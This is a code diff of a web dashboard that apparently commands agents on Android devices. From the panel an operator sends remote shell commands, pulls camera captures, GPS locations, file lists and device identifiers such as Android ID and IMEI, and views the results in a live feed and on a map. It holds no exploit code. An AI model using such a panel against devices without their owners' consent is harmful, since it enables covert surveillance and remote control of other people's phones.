-                if (firstOnline) selectDevice(firstOnline.id);
-            }
+  const cls = module || 'generic';
+  const entry = document.createElement('div');
+  entry.className = `feed-entry ${cls}`;
+  entry.setAttribute('data-module', cls);
 
-            setQuickButtonsEnabled(selectedDevice && devices[selectedDevice]?.online);
-            document.getElementById('send-btn').disabled = !(selectedDevice && devices[selectedDevice]?.online);
-        }
+  let bodyHtml = '';
+  const envType = (parsed?.type||'').toLowerCase();
 
-        function updateStats(list) {
-            const total = list.length;
-            const online = list.filter(d => d.online).length;
-            document.getElementById('total-devices').textContent = total;
-            document.getElementById('online-devices').textContent = online;
-            document.getElementById('offline-devices').textContent = total - online;
-            document.getElementById('result-count').textContent = resultCount;
-        }
+  if (payload?.image_base64) {
+    const b64 = payload.image_base64;
+    const fmt = payload.format || 'jpeg';
+    bodyHtml = `<img class="feed-image" src="data:image/${fmt.toLowerCase()};base64,${b64}" onclick="showImageModal(this.src)" alt="Camera">`;
+  } else if (payload?.stdout !== undefined) {
+    const out = (payload.stdout||'') + (payload.stderr ? '\n[stderr] '+payload.stderr : '');
+    bodyHtml = `<div class="feed-body">${escHtml(out.trim()||'(empty)')}</div>`;
+    if (payload.exit_code !== undefined) {
+      bodyHtml += `<div style="font-size:10px;color:var(--dim);margin-top:2px">Exit: ${payload.exit_code}</div>`;
+    }
+  } else if (payload?.pong !== undefined || envType.includes('ping') || (payload?.type==='ping')) {
+    bodyHtml = `<div class="ping-badge">✅ Pong${payload?.latency_ms!==undefined?' — '+payload.latency_ms+'ms':''}</div>`;
+  } else if (payload?.lat !== undefined) {
+    bodyHtml = `<div class="location-block">📍 <span class="coords">${payload.lat.toFixed(6)}, ${payload.lng.toFixed(6)}</span>${payload.accuracy!==undefined?' · ±'+payload.accuracy.toFixed(1)+'m':''}${payload.provider?' · '+escHtml(payload.provider):''}</div>`;
+  } else if (payload?.model || payload?.fingerprint) {
+    bodyHtml = `<div class="info-card">${[
+      ['Model',payload.model],['Brand',payload.brand],['SDK',payload.sdk],['Release',payload.release],
+      ['Fingerprint',payload.fingerprint],['Hardware',payload.hardware],['Android ID',payload.android_id]
+    ].filter(([,v])=>v).map(([k,v])=>`<div class="info-row"><span class="info-label">${escHtml(k)}</span><span class="info-value">${escHtml(String(v))}</span></div>`).join('')}</div>`;
+  } else if (payload?.entries) {
+    bodyHtml = `<div class="feed-body">📁 ${payload.entries.length} files listed</div>`;
+  } else if (parsed?.error || payload?.error || envType.includes('error') || (payload?.type==='error')) {
+    bodyHtml = `<div class="error-block">❌ ${escHtml(parsed?.error||payload?.error||'Unknown error')}</div>`;
+  } else if (payload?.base64_data) {
+    bodyHtml = `<div class="feed-body">📄 File data received (${payload.mime_type||'unknown'} · ${fmtSize(payload.size_bytes||0)})</div>`;
+  } else {
+    let pretty = '';
+    if (payload && Object.keys(payload).length > 0) pretty = JSON.stringify(payload, null, 2);
+    else if (parsed) pretty = JSON.stringify(parsed, null, 2);
+    else pretty = result.data || '';
+    bodyHtml = `<div class="feed-body">${escHtml(pretty)}</div>`;
+  }
 
-        function selectDevice(id) {
-            selectedDevice = id;
-            const dev = devices[id];
-            setQuickButtonsEnabled(dev?.online || false);
-            document.getElementById('send-btn').disabled = !(dev?.online);
-            pollDevices(); // re-render selection
-        }
+  entry.innerHTML = `
+    <div class="feed-meta">
+      📱 ${escHtml((result.device_id||'').substring(0,14))}…
+      <span class="feed-tag ${cls}">${escHtml(module||'?')}</span>
+      ${result.command_id?`· #${escHtml((result.command_id||'').substring(0,8))}`:''}
+      · ${fmtTime(result.time)}
+    </div>
+    ${bodyHtml}
+  `;
 
-        function setQuickButtonsEnabled(on) {
-            document.querySelectorAll('.qbtn').forEach(b => b.disabled = !on);
-        }
+  feed.insertBefore(entry, feed.firstChild);
+  applyFeedFilter();
 
-        // ── Command sending ─────────────────────────────────────────
-        async function sendCommand() {
-            const dev = devices[selectedDevice];
-            if (!dev || !dev.online) {
-                toast('Device is offline');
-                return;
-            }
-            const module = document.getElementById('cmd-module').value.trim();
-            const action = document.getElementById('cmd-action').value.trim();
-            const paramsStr = document.getElementById('cmd-params').value.trim();
+  // Trim old entries (keep 200)
+  while (feed.children.length > 200) feed.lastChild.remove();
 
-            if (!module || !action) {
-                toast('Module and action are required');
-                return;
-            }
+  // Update badge
+  const badge = document.getElementById('badge-feed');
+  const visible = feed.querySelectorAll('.feed-entry:not([style*="display: none"])').length;
+  badge.textContent = visible;
+  badge.style.display = visible > 0 ? 'inline' : 'none';
+}
 
-            let params = {};
-            if (paramsStr) {
-                try { params = JSON.parse(paramsStr); }
-                catch(e) { toast('Invalid JSON: ' + e.message); return; }
-            }
+function applyFeedFilter() {
+  const entries = document.querySelectorAll('#live-feed .feed-entry');
+  entries.forEach(e => {
+    if (currentFeedFilter === 'all' || e.getAttribute('data-module') === currentFeedFilter) {
+      e.style.display = '';
+    } else {
+      e.style.display = 'none';
+    }
+  });
+  const badge = document.getElementById('badge-feed');
+  const visible = document.querySelectorAll('#live-feed .feed-entry:not([style*="display: none"])').length;
+  badge.textContent = visible;
+  badge.style.display = visible > 0 ? 'inline' : 'none';
+}
 
-            const btn = document.getElementById('send-btn');
-            btn.classList.add('loading');
-            btn.disabled = true;
+// Feed filter buttons
+document.getElementById('feed-filter').addEventListener('click', (e) => {
+  if (e.target.classList.contains('flt')) {
+    document.querySelectorAll('#feed-filter .flt').forEach(b => b.classList.remove('active'));
+    e.target.classList.add('active');
+    currentFeedFilter = e.target.getAttribute('data-flt');
+    applyFeedFilter();
+  }
+});
 
-            try {
-                const res = await fetch(API + '/api/command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device_id: selectedDevice, module, action, params })
-                });
-                const data = await res.json();
-                if (data.command_id) {
-                    document.getElementById('cmd-params').value = '';
-                    toast('Command sent: ' + module + '/' + action, 'success');
-                } else {
-                    toast('Error: ' + (data.error || 'Unknown'));
-                }
-            } catch(e) {
-                toast('Send failed: ' + e.message);
-            } finally {
-                btn.classList.remove('loading');
-                btn.disabled = false;
-            }
-        }
+// ========== MAP ==========
+function initMap() {
+  if (mapInstance) return;
+  const container = document.getElementById('map-container');
+  mapInstance = L.map(container).setView([20, 0], 2);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '&copy; OSM', maxZoom: 19
+  }).addTo(mapInstance);
+  // Invalidate size when tab becomes visible
+  setTimeout(() => mapInstance.invalidateSize(), 100);
+}
 
-        function quickAction(module, action, params) {
-            document.getElementById('cmd-module').value = module;
-            document.getElementById('cmd-action').value = action;
-            document.getElementById('cmd-params').value = params ? JSON.stringify(params) : '';
-            sendCommand();
-        }
+function updateMap(lat, lng, accuracy, provider) {
+  if (!mapInstance) initMap();
+  document.getElementById('map-empty').style.display = 'none';
 
-        function quickShell() {
-            const cmd = prompt('Shell command to execute:', 'id');
-            if (!cmd) return;
-            quickAction('shell', 'exec', { cmd: cmd });
-        }
+  if (mapMarker) mapInstance.removeLayer(mapMarker);
+  mapMarker = L.marker([lat, lng]).addTo(mapInstance);
+  if (accuracy) mapMarker.bindPopup(`±${accuracy.toFixed(1)}m`).openPopup();
+  mapInstance.setView([lat, lng], 15);
 
-        // ── SSE (Server-Sent Events) ────────────────────────────────
-        function connectSSE() {
-            const evtSource = new EventSource(API + '/api/events');
-            evtSource.onopen = function() {
-                sseConnected = true;
-                document.getElementById('sse-dot').className = 'dot green';
-                document.getElementById('sse-status').textContent = 'SSE Connected';
-            };
-            evtSource.onmessage = function(event) {
-                try {
-                    const result = JSON.parse(event.data);
-                    handleResult(result);
-                } catch(e) { console.error('SSE parse:', e); }
-            };
-            evtSource.onerror = function(e) {
-                sseConnected = false;
-                document.getElementById('sse-dot').className = 'dot red';
-                document.getElementById('sse-status').textContent = 'SSE Disconnected (retrying...)';
-                evtSource.close();
-                setTimeout(connectSSE, 3000);
-            };
-        }
+  document.getElementById('map-pin-info').style.display = 'block';
+  document.getElementById('map-pin-coords').textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+  document.getElementById('map-pin-meta').innerHTML =
+    `${accuracy!==undefined?`Accuracy: ±${accuracy.toFixed(1)}m` : ''}${provider?` · Provider: ${escHtml(provider)}`:''}`;
+}
 
-        let firstResult = true;
-        function handleResult(result) {
-            resultCount++;
-            document.getElementById('result-count').textContent = resultCount;
+// ========== TAB SWITCHING ==========
+function switchTab(name) {
+  activeTab = name;
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('#main-tabs button').forEach(b => b.classList.remove('active'));
 
-            // Parse the data — it's a JSON envelope from the agent
-            let parsed = null;
-            let moduleName = result.module || '';
-            let actionName = result.action || '';
+  const panel = document.getElementById('panel-' + name);
+  const tabBtn = document.querySelector(`#main-tabs button[data-tab="${name}"]`);
+  if (panel) panel.classList.add('active');
+  if (tabBtn) tabBtn.classList.add('active');
 
-            try {
-                parsed = JSON.parse(result.data);
-            } catch(e) { /* raw data, treat as plain text */ }
+  // Init map when switching to map tab
+  if (name === 'map') {
+    setTimeout(() => {
+      if (!mapInstance) initMap();
+      mapInstance.invalidateSize();
+    }, 150);
+  }
 
-            // Derive module/action from parsed envelope type if not provided
-            if (parsed && parsed.type && !moduleName) {
-                moduleName = inferModule(parsed.type);
-            }
-            // If still no module, try to derive from payload discriminator
-            if (!moduleName && parsed && parsed.payload && parsed.payload.type) {
-                moduleName = inferModule(parsed.payload.type);
-            }
+  // Clear feed badge when viewing feed
+  if (name === 'feed') {
+    document.getElementById('badge-feed').style.display = 'none';
+  }
+}
 
-            const payload = parsed?.payload || null;
-            const envelopeType = (parsed?.type || '').toLowerCase();
-            const payloadType = (payload?.type || '').toLowerCase();
+document.getElementById('main-tabs').addEventListener('click', (e) => {
+  if (e.target.tagName === 'BUTTON') {
+    const tab = e.target.getAttribute('data-tab');
+    if (tab) switchTab(tab);
+  }
+});
 
-            // Route to type-specific handlers
-            if (parsed?.status === 'error' || parsed?.error || envelopeType.includes('error') || payloadType.includes('error')) {
-                addErrorResult(result, parsed);
-            } else if (payload?.image_base64 || envelopeType.includes('camera') || payloadType === 'camera') {
-                // Camera — image_base64 from direct payload or nested
-                const b64 = payload?.image_base64 || '';
-                const fmt = payload?.format || 'jpeg';
-                const w = payload?.width || 0;
-                const h = payload?.height || 0;
-                const sz = payload?.size_bytes || 0;
-                if (b64) {
-                    addCameraResult(result, b64, fmt, w, h, sz);
-                } else {
-                    addGenericResult(result, parsed, moduleName, actionName);
-                }
-            } else if (payload?.pong !== undefined || envelopeType.includes('ping') || payloadType === 'ping') {
-                addPingResult(result, payload);
-            } else if (payload?.stdout !== undefined || envelopeType.includes('shell') || payloadType === 'shell') {
-                addShellResult(result, payload);
-            } else if (payload?.model !== undefined || payload?.fingerprint !== undefined || envelopeType.includes('device_info') || payloadType === 'device_info') {
-                addDeviceInfoResult(result, payload);
-            } else if (payload?.entries && Array.isArray(payload.entries)) {
-                addFileList(result.device_id, result.time, payload.entries);
-                addFileFeedResult(result, payload.entries, moduleName, actionName);
-            } else if (payload?.lat !== undefined || envelopeType.includes('location') || payloadType === 'location') {
-                addLocationResult(result, payload);
-            } else if (payload?.base64_data || payload?.mime_type) {
-                // File read result with base64 data
-                addGenericResult(result, parsed, moduleName, actionName);
-            } else {
-                // Generic: pretty-print JSON
-                addGenericResult(result, parsed, moduleName, actionName);
-            }
-        }
+// ========== IMAGE MODAL ==========
+function showImageModal(src) {
+  document.getElementById('modal-image').src = src;
+  document.getElementById('image-modal').classList.add('show');
+}
+function closeImageModal() {
+  document.getElementById('image-modal').classList.remove('show');
+}
 
-        function inferModule(typeStr) {
-            const t = typeStr.toLowerCase();
-            if (t.includes('shell')) return 'shell';
-            if (t.includes('camera')) return 'camera';
-            if (t.includes('file')) return 'files';
-            if (t.includes('device') || t.includes('info')) return 'info';
-            if (t.includes('location')) return 'location';
-            if (t.includes('ping')) return 'ping';
-            if (t.includes('clipboard')) return 'clipboard';
-            if (t.includes('permission')) return 'permission';
-            if (t.includes('knox')) return 'knox';
-            if (t.includes('error')) return 'error';
-            return typeStr;
-        }
+// ========== KEYBOARD SHORTCUTS ==========
+document.addEventListener('keydown', (e) => {
+  // Ctrl+Enter to send command
+  if (e.ctrlKey && e.key === 'Enter') {
+    e.preventDefault();
+    if (activeTab === 'console') sendCommand();
+    else if (activeTab === 'shell') execShell();
+  }
+  // Ctrl+1-6 to switch tabs
+  const tabKeys = {1:'feed',2:'console',3:'files',4:'camera',5:'shell',6:'map'};
+  if (e.ctrlKey && tabKeys[e.key]) {
+    e.preventDefault();
+    switchTab(tabKeys[e.key]);
+  }
+});
 
-        // ── Per-type result helpers ──────────────────────────────────
+// Params input Enter submits
+document.getElementById('cmd-params').addEventListener('keydown', (e) => {
+  if (e.key === 'Enter' && !document.getElementById('cmd-send-btn').disabled) {
+    sendCommand();
+  }
+});
 
-        function addCameraResult(result, b64, fmt, width, height, sizeBytes) {
-            // Add to camera tab
-            addImageToCamera(result.device_id, result.time, b64, fmt, width, height, sizeBytes);
+// ========== UTILITIES ==========
+function escHtml(s) {
+  if (!s) return '';
+  const d = document.createElement('div');
+  d.textContent = String(s);
+  return d.innerHTML;
+}
+function escAttr(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+function fmtTime(iso) {
+  if (!iso) return '';
+  try { return new Date(iso).toLocaleTimeString(); }
+  catch(e) { return iso; }
+}
+function fmtSize(bytes) {
+  if (!bytes || bytes===0) return '0 B';
+  if (bytes>1073741824) return (bytes/1073741824).toFixed(1)+' GB';
+  if (bytes>1048576) return (bytes/1048576).toFixed(1)+' MB';
+  if (bytes>1024) return (bytes/1024).toFixed(1)+' KB';
+  return bytes+' B';
+}
+function toast(msg, type) {
+  const t = document.createElement('div');
+  t.className = 'toast '+(type||'');
+  t.textContent = msg;
+  document.getElementById('toast-container').appendChild(t);
+  setTimeout(() => t.remove(), 3500);
+}
 
-            // Render in feed
-            const feed = document.getElementById('result-feed');
-            clearFirstResult(feed);
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-            entry.innerHTML = `
-                <div class="result-meta">
-                    📱 ${esc(result.device_id?.substring(0,14))}...
-                    <span class="module-tag camera">camera/capture</span>
-                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
-                    · ${fmtTime(result.time)}
-                    ${width > 0 ? `· ${width}×${height}` : ''}
-                    ${sizeBytes > 0 ? `· ${fmtSize(sizeBytes)}` : ''}
-                </div>
-                <img class="result-image" src="data:image/${(fmt||'jpeg').toLowerCase()};base64,${b64}"
-                    onclick="showModal(this.src)" alt="Camera capture" title="Click to enlarge">
-            `;
-            prependAndScroll(feed, entry);
-        }
+function b64toBlob(b64, mime) {
+  const byteChars = atob(b64);
+  const byteNums = new Array(byteChars.length);
+  for (let i = 0; i < byteChars.length; i++) byteNums[i] = byteChars.charCodeAt(i);
+  return new Blob([new Uint8Array(byteNums)], { type: mime || 'application/octet-stream' });
+}
 
-        function addPingResult(result, payload) {
-            const feed = document.getElementById('result-feed');
-            clearFirstResult(feed);
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-            const latency = payload?.latency_ms;
-            entry.innerHTML = `
-                <div class="result-meta">
-                    📱 ${esc(result.device_id?.substring(0,14))}...
-                    <span class="module-tag ping">ping/ping</span>
-                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
-                    · ${fmtTime(result.time)}
-                    ${latency !== undefined ? `· ${latency}ms` : ''}
-                </div>
-                <div class="ping-ok"><span class="check-icon">✅</span> Pong${latency !== undefined ? ' — ' + latency + 'ms' : ''}</div>
-            `;
-            prependAndScroll(feed, entry);
-        }
+// Restore camera gallery on load
+if (cameraImages.length > 0) renderCameraGallery();
 
-        function addShellResult(result, payload) {
-            const feed = document.getElementById('result-feed');
-            clearFirstResult(feed);
-            const exitCode = payload?.exit_code;
-            const stdout = payload?.stdout || '';
-            const stderr = payload?.stderr || '';
-            const output = (stdout + (stderr ? '\n[stderr]\n' + stderr : '')).trim() || '(empty output)';
+// ========== INIT ==========
+pollDevices();
+setInterval(pollDevices, 2000);
+connectSSE();
+initMap();
 
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-            entry.innerHTML = `
-                <div class="result-meta">
-                    📱 ${esc(result.device_id?.substring(0,14))}...
-                    <span class="module-tag shell">shell/exec</span>
-                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
-                    · ${fmtTime(result.time)}
-                </div>
-                <div class="shell-output">${esc(output)}
-                ${exitCode !== undefined ? `<div class="exit-code${exitCode !== 0 ? ' nonzero' : ''}">exit code: ${exitCode}</div>` : ''}
-                </div>
-            `;
-            prependAndScroll(feed, entry);
-        }
-
-        function addDeviceInfoResult(result, payload) {
-            const feed = document.getElementById('result-feed');
-            clearFirstResult(feed);
-            const p = payload || {};
-
-            const rows = [
-                ['Model', p.model],
-                ['Brand', p.brand],
-                ['Manufacturer', p.manufacturer],
-                ['SDK', p.sdk],
-                ['Release', p.release],
-                ['Fingerprint', p.fingerprint],
-                ['Hardware', p.hardware],
-                ['Android ID', p.android_id],
-                ['IMEI', p.imei]
-            ].filter(([,v]) => v !== undefined && v !== null && v !== '');
-
-            const infoRowsHtml = rows.map(([label, value]) =>
-                `<div class="info-row"><span class="info-label">${esc(label)}</span><span class="info-value">${esc(String(value))}</span></div>`
-            ).join('');
-
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-            entry.innerHTML = `
-                <div class="result-meta">
-                    📱 ${esc(result.device_id?.substring(0,14))}...
-                    <span class="module-tag info">info/gather</span>
-                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
-                    · ${fmtTime(result.time)}
-                </div>
-                <div class="info-card">${infoRowsHtml || '<div style="color:var(--dim);">No device info</div>'}</div>
-            `;
-            prependAndScroll(feed, entry);
-        }
-
-        function addLocationResult(result, payload) {
-            const feed = document.getElementById('result-feed');
-            clearFirstResult(feed);
-            const p = payload || {};
-            const lat = p.lat;
-            const lng = p.lng;
-            const acc = p.accuracy;
-            const prov = p.provider;
-
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-            entry.innerHTML = `
-                <div class="result-meta">
-                    📱 ${esc(result.device_id?.substring(0,14))}...
-                    <span class="module-tag location">location/get</span>
-                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
-                    · ${fmtTime(result.time)}
-                </div>
-                <div class="location-display">
-                    📍 <span class="coords">${lat?.toFixed(6)}, ${lng?.toFixed(6)}</span>
-                    ${acc !== undefined ? ` · ±${acc.toFixed(1)}m` : ''}
-                    ${prov ? ` · via ${esc(prov)}` : ''}
-                </div>
-            `;
-            prependAndScroll(feed, entry);
-        }
-
-        function addErrorResult(result, parsed) {
-            const feed = document.getElementById('result-feed');
-            clearFirstResult(feed);
-            const errMsg = parsed?.error || parsed?.payload?.error || 'Unknown error';
-            const mod = parsed?.payload?.module || 'error';
-
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-            entry.innerHTML = `
-                <div class="result-meta">
-                    📱 ${esc(result.device_id?.substring(0,14))}...
-                    <span class="module-tag error">${esc(mod)}/error</span>
-                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
-                    · ${fmtTime(result.time)}
-                </div>
-                <div class="error-block">❌ ${esc(errMsg)}</div>
-            `;
-            prependAndScroll(feed, entry);
-        }
-
-        function addGenericResult(result, parsed, moduleName, actionName) {
-            const feed = document.getElementById('result-feed');
-            clearFirstResult(feed);
-            let prettyData;
-            if (parsed && parsed.payload && typeof parsed.payload === 'object') {
-                prettyData = JSON.stringify(parsed.payload, null, 2);
-            } else if (parsed) {
-                prettyData = JSON.stringify(parsed, null, 2);
-            } else {
-                prettyData = result.data || '';
-            }
-
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-            entry.innerHTML = `
-                <div class="result-meta">
-                    📱 ${esc(result.device_id?.substring(0,14))}...
-                    ${moduleName ? `<span class="module-tag ${moduleName}">${esc(moduleName)}/${esc(actionName || '?')}</span>` : ''}
-                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
-                    · ${fmtTime(result.time)}
-                </div>
-                <div class="result-payload">${esc(prettyData)}</div>
-            `;
-            prependAndScroll(feed, entry);
-        }
-
-        // ── Helpers ──────────────────────────────────────────────────
-        function clearFirstResult(feed) {
-            if (firstResult) {
-                feed.innerHTML = '';
-                firstResult = false;
-            }
-        }
-
-        function prependAndScroll(feed, entry) {
-            feed.insertBefore(entry, feed.firstChild);
-            feed.scrollTop = 0;
-        }
-
-        function addImageToCamera(deviceId, time, base64, format, width, height, sizeBytes) {
-            const feed = document.getElementById('camera-feed');
-            // Clear empty state
-            if (feed.querySelector('.empty-state')) feed.innerHTML = '';
-
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-            entry.innerHTML = `
-                <div class="result-meta">
-                    📱 ${esc(deviceId?.substring(0,14))}... · <span class="module-tag camera">camera/capture</span> · ${fmtTime(time)}
-                    ${width > 0 ? `· ${width}×${height}` : ''}
-                    ${sizeBytes > 0 ? `· ${fmtSize(sizeBytes)}` : ''}
-                </div>
-                <img class="result-image" src="data:image/${(format||'jpeg').toLowerCase()};base64,${base64}" 
-                    onclick="showModal(this.src)" alt="Camera capture" title="Click to enlarge">
-            `;
-            feed.insertBefore(entry, feed.firstChild);
-        }
-
-        function addFileList(deviceId, time, entries) {
-            const feed = document.getElementById('files-feed');
-            if (feed.querySelector('.empty-state')) feed.innerHTML = '';
-
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-
-            let tableHtml = `<div class="result-meta">📱 ${esc(deviceId?.substring(0,14))}... · <span class="module-tag files">files/list</span> · ${fmtTime(time)} · ${entries.length} entries</div>
-            <table class="file-table">
-            <thead><tr><th>Name</th><th>Size</th><th>Date</th><th>Path</th></tr></thead><tbody>`;
-
-            entries.forEach(f => {
-                const sizeStr = fmtSize(f.size);
-                const dateStr = f.date ? new Date(f.date).toLocaleString() : '—';
-                tableHtml += `<tr>
-                    <td>${esc(f.name || f.id || '?')}</td>
-                    <td>${sizeStr}</td>
-                    <td>${dateStr}</td>
-                    <td style="font-size:10px;color:#8b949e;">${esc(f.path || '')}</td>
-                </tr>`;
-            });
-
-            tableHtml += '</tbody></table>';
-            entry.innerHTML = tableHtml;
-            feed.insertBefore(entry, feed.firstChild);
-        }
-
-        function addFileFeedResult(result, entries, moduleName, actionName) {
-            const feed = document.getElementById('result-feed');
-            const entry = document.createElement('div');
-            entry.className = 'result-entry';
-
-            let tableHtml = `<div class="result-meta">📱 ${esc(result.device_id?.substring(0,14))}... · <span class="module-tag files">${esc(moduleName||'files')}/${esc(actionName||'list')}</span> · ${fmtTime(result.time)} · ${entries.length} entries</div>
-            <table class="file-table">
-            <thead><tr><th>Name</th><th>Size</th><th>Date</th><th>Path</th></tr></thead><tbody>`;
-
-            entries.forEach(f => {
-                const sizeStr = fmtSize(f.size);
-                const dateStr = f.date ? new Date(f.date).toLocaleString() : '—';
-                tableHtml += `<tr>
-                    <td>${esc(f.name || f.id || '?')}</td>
-                    <td>${sizeStr}</td>
-                    <td>${dateStr}</td>
-                    <td style="font-size:10px;color:#8b949e;">${esc(f.path || '')}</td>
-                </tr>`;
-            });
-
-            tableHtml += '</tbody></table>';
-            entry.innerHTML = tableHtml;
-            prependAndScroll(feed, entry);
-        }
-
-        // ── Tabs ────────────────────────────────────────────────────
-        function switchTab(name) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.result-tabs button').forEach(b => b.classList.remove('active'));
-            document.getElementById('content-' + name).classList.add('active');
-            document.getElementById('tab-' + name).classList.add('active');
-        }
-
-        // ── Image modal ─────────────────────────────────────────────
-        function showModal(src) {
-            document.getElementById('modal-img').src = src;
-            document.getElementById('image-modal').classList.add('show');
-        }
-        function closeModal() {
-            document.getElementById('image-modal').classList.remove('show');
-        }
-
-        // ── Utilities ───────────────────────────────────────────────
-        function esc(s) {
-            if (!s) return '';
-            const div = document.createElement('div');
-            div.textContent = String(s);
-            return div.innerHTML;
-        }
-
-        function fmtTime(iso) {
-            if (!iso) return '';
-            try { return new Date(iso).toLocaleTimeString(); }
-            catch(e) { return iso; }
-        }
-
-        function fmtSize(bytes) {
-            if (!bytes || bytes === 0) return '0 B';
-            if (bytes > 1073741824) return (bytes/1073741824).toFixed(1) + ' GB';
-            if (bytes > 1048576) return (bytes/1048576).toFixed(1) + ' MB';
-            if (bytes > 1024) return (bytes/1024).toFixed(1) + ' KB';
-            return bytes + ' B';
-        }
-
-        function toast(msg, type) {
-            const t = document.createElement('div');
-            t.className = 'toast';
-            if (type === 'success') t.style.borderColor = '#3fb950';
-            t.textContent = msg;
-            document.body.appendChild(t);
-            setTimeout(() => t.remove(), 3000);
-        }
-
-        // ── Init ────────────────────────────────────────────────────
-        pollDevices();
-        setInterval(pollDevices, 1500);
-        connectSSE();
-
-        // Keyboard shortcut: Enter in params field sends command
-        document.getElementById('cmd-params').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && !document.getElementById('send-btn').disabled) {
-                sendCommand();
-            }
-        });
-    </script>
+// Handle window resize for map
+window.addEventListener('resize', () => {
+  if (mapInstance && activeTab === 'map') {
+    setTimeout(() => mapInstance.invalidateSize(), 100);
+  }
+});
+</script>
 </body>
 </html>
